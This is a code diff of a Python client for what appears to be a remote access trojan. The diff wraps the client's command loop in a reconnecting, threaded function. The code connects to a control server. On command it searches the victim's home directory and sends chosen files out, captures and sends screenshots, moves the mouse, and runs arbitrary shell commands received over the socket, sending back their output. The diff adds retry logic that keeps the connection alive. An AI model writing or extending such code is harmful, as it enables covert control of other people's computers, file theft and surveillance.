@@ -55,7 +55,6 @@ second_port = port + 1
 disconnect_message = "!DISCONNECT"
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((server_ip, port))
 
 second_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 second_client.connect((server_ip, second_port))
@@ -91,82 +90,100 @@ def second_send(msg):
 
 
 t = schedule_heartbeat()
-send("CONNECT")
 
-while True:
-    command = client.recv(header).decode('utf-8')
-    if len(command) > 0:
-        if command == "GIVE_FILES":
-            send("GIVE_NAME")
-            time.sleep(0.5)
-            keyword = client.recv(header).decode("utf-8")
-            data_list = find_all(keyword, pathlib.Path.home())
-            send(str(data_list))
-            send("MAKE_CHOICE")
-            number_in_list = client.recv(2048).decode('utf-8')
-            print(number_in_list)
+
+def start():
+    while True:
+        try:
             try:
-                file_name = str(data_list[int(number_in_list)])
-                send("FILE")
+                client.connect((server_ip, port))
+            except:
+                pass
 
-                with open(file_name, 'rb') as f:  # open a text file
-                    binary_data = f.read()
-                    pickled_file = pickle.dumps(binary_data)
-                print("PICKLED")
-                print(type(pickled_file))
-                print(file_name.split(".")[1])
+            command = client.recv(header).decode('utf-8')
+            if len(command) > 0:
+                if command == "GIVE_FILES":
+                    send("GIVE_NAME")
+                    time.sleep(0.5)
+                    keyword = client.recv(header).decode("utf-8")
+                    data_list = find_all(keyword, pathlib.Path.home())
+                    send(str(data_list))
+                    send("MAKE_CHOICE")
+                    number_in_list = client.recv(2048).decode('utf-8')
+                    print(number_in_list)
 
-                client.send(pickled_file)
-                time.sleep(1)
-                client.send("hello".encode("utf-8"))
+                    file_name = str(data_list[int(number_in_list)])
+                    send("FILE")
 
-                print("sent")
-            except Exception as e:
-                print(e)
+                    with open(file_name, 'rb') as f:  # open a text file
+                        binary_data = f.read()
+                        pickled_file = pickle.dumps(binary_data)
+                    print("PICKLED")
+                    print(type(pickled_file))
+                    print(file_name.split(".")[1])
 
-        if command == "SCREENSHOT":
-            s = pyautogui.screenshot()
-            print(type(s))
-            serialized_screen = pickle.dumps(s)
+                    client.send(pickled_file)
+                    time.sleep(1)
+                    client.send("hello".encode("utf-8"))
 
-            send("SCREENSHOT")
-            time.sleep(1)
-            client.send(str(len(pickle.dumps(s))).encode('utf-8'))
-            time.sleep(1)
-            client.send(serialized_screen)
-            time.sleep(1)
-            print(client.recv(header))
+                    print("sent")
 
-        if command == "MOVE_MOUSE":
-            send("MOVE_MOUSE")
-            x_coordinates = int(client.recv(header).decode("utf-8"))
-            y_coordinates = int(client.recv(header).decode("utf-8"))
+                if command == "SCREENSHOT":
+                    s = pyautogui.screenshot()
+                    print(type(s))
+                    serialized_screen = pickle.dumps(s)
 
-            print(x_coordinates, y_coordinates)
-            pyautogui.moveTo(x_coordinates, y_coordinates, duration=2)
-            print("done")
+                    send("SCREENSHOT")
+                    time.sleep(1)
+                    client.send(str(len(pickle.dumps(s))).encode('utf-8'))
+                    time.sleep(1)
+                    client.send(serialized_screen)
+                    time.sleep(1)
+                    print(client.recv(header))
 
-        if command == "SHELL":
-            send("SHELL")
-            while True:
-                command = client.recv(1024)
-                print(command)
-                if command == b'exit':
+                if command == "MOVE_MOUSE":
+                    send("MOVE_MOUSE")
+                    x_coordinates = int(client.recv(header).decode("utf-8"))
+                    y_coordinates = int(client.recv(header).decode("utf-8"))
+
+                    print(x_coordinates, y_coordinates)
+                    pyautogui.moveTo(x_coordinates, y_coordinates, duration=2)
+                    print("done")
+
+                if command == "SHELL":
+                    send("SHELL")
+                    while True:
+                        command = client.recv(1024)
+                        print(command)
+                        if command == b'exit':
+                            break
+                        else:
+
+                            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                                    stdin=subprocess.PIPE)
+
+                            output = proc.stdout.read() + proc.stderr.read()
+                            print(output)
+                            if output == b'':
+                                client.send("NO OUTPUT".encode("utf-8"))
+                            else:
+                                client.send(output)
+
+                if command == "DISCONNECT":
+                    send(disconnect_message)
+                    t.cancel()
+                    second_send(disconnect_message)
                     break
-                else:
+        except Exception as e:
+            print("try again...")
+            print(e)
+            time.sleep(3)
+            continue
 
-                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                            stdin=subprocess.PIPE)
 
-                    output = proc.stdout.read() + proc.stderr.read()
-                    print(output)
-                    if output == b'':
-                        client.send("NO OUTPUT".encode("utf-8"))
-                    else:
-                        client.send(output)
-
-        if command == "DISCONNECT":
-            send(disconnect_message)
-            t.cancel()
-            second_send(disconnect_message)
-            break
+if __name__ == "__main__":
+    thread1 = threading.Thread(target=start)
+    thread1.start()
+    if not thread1.is_alive():
+        print("trying")
+        thread1.start()
